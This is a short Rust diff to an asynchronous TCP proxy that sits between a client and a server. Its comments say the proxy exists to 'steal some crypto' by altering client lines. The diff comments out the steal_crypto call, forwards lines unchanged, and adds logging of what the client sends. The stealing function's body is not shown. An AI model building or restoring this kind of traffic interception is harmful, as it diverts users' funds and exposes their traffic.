@@ -86,14 +86,16 @@ async fn process(to_client_stream: TcpStream, addr: SocketAddr) -> Result<()> {
                 .await
                 .expect("Unable to read from client");
 
+            info!("Client sent: {}", line_from_client);
+
             if n == 0 {
                 break;
             }
             // try to steal some crypto
-            let altered_line = steal_crypto(&line_from_client);
+            // let altered_line = steal_crypto(&line_from_client);
             // and then we pass the altered line
             server_writer
-                .write_all(altered_line.as_bytes())
+                .write_all(line_from_client.as_bytes())
                 .await
                 .expect("Unable to send to server");
         }
